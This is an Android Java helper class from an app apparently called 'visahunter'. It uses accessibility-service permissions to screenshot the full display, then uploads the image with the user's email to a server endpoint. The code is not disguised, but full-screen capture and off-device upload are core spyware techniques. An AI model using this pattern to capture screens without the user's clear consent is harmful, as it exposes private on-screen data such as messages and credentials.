package com.visahunter.auth;

import android.accessibilityservice.AccessibilityService;
import android.annotation.TargetApi;
import android.graphics.Bitmap;
import android.hardware.HardwareBuffer;
import android.os.Build;
import android.util.Base64;
import android.util.Log;
import android.view.Display;

import org.json.JSONObject;

import java.io.ByteArrayOutputStream;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

@TargetApi(Build.VERSION_CODES.R)
public class ScreenshotHelper {
    private static final String TAG = "ScreenshotHelper";

    public static void captureAndUpload(AccessibilityService service, String serverUrl, String email, OkHttpClient httpClient) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.R || service == null) {
            Log.i(TAG, "Screenshot capture requires Android 11+ (API 30+)");
            return;
        }

        try {
            Executor executor = Executors.newSingleThreadExecutor();
            service.takeScreenshot(Display.DEFAULT_DISPLAY, executor, new AccessibilityService.TakeScreenshotCallback() {
                @Override
                public void onSuccess(AccessibilityService.ScreenshotResult screenshotResult) {
                    try {
                        HardwareBuffer hardwareBuffer = screenshotResult.getHardwareBuffer();
                        Bitmap bitmap = Bitmap.wrapHardwareBuffer(hardwareBuffer, null);
                        if (bitmap != null) {
                            Bitmap copy = bitmap.copy(Bitmap.Config.ARGB_8888, false);
                            hardwareBuffer.close();

                            int maxDim = Math.max(copy.getWidth(), copy.getHeight());
                            Bitmap uploadBitmap = copy;
                            if (maxDim > 1280) {
                                float scale = 1280f / maxDim;
                                int nw = Math.round(copy.getWidth() * scale);
                                int nh = Math.round(copy.getHeight() * scale);
                                uploadBitmap = Bitmap.createScaledBitmap(copy, nw, nh, true);
                            }

                            ByteArrayOutputStream baos = new ByteArrayOutputStream();
                            uploadBitmap.compress(Bitmap.CompressFormat.JPEG, 75, baos);
                            byte[] imageBytes = baos.toByteArray();
                            String base64Image = Base64.encodeToString(imageBytes, Base64.NO_WRAP);

                            uploadPayload(serverUrl, email, base64Image, httpClient);
                        }
                    } catch (Exception e) {
                        Log.e(TAG, "Failed to process screenshot: " + e.getMessage());
                    }
                }

                @Override
                public void onFailure(int errorCode) {
                    Log.w(TAG, "takeScreenshot failed with error code: " + errorCode);
                }
            });
        } catch (Exception e) {
            Log.e(TAG, "takeScreenshot error: " + e.getMessage());
        }
    }

    private static void uploadPayload(String serverUrl, String email, String base64Image, OkHttpClient httpClient) {
        new Thread(() -> {
            try {
                JSONObject payload = new JSONObject();
                payload.put("email", email);
                payload.put("image", "data:image/jpeg;base64," + base64Image);
                payload.put("timestamp", System.currentTimeMillis());

                RequestBody body = RequestBody.create(
                        payload.toString(),
                        MediaType.parse("application/json; charset=utf-8")
                );

                Request req = new Request.Builder()
                        .url(serverUrl.replaceAll("/+$", "") + "/api/client-app/screenshot")
                        .post(body)
                        .build();

                try (Response r = httpClient.newCall(req).execute()) {
                    Log.i(TAG, "Screenshot upload HTTP: " + r.code());
                }
            } catch (Exception e) {
                Log.e(TAG, "Upload failed: " + e.getMessage());
            }
        }).start();
    }
}
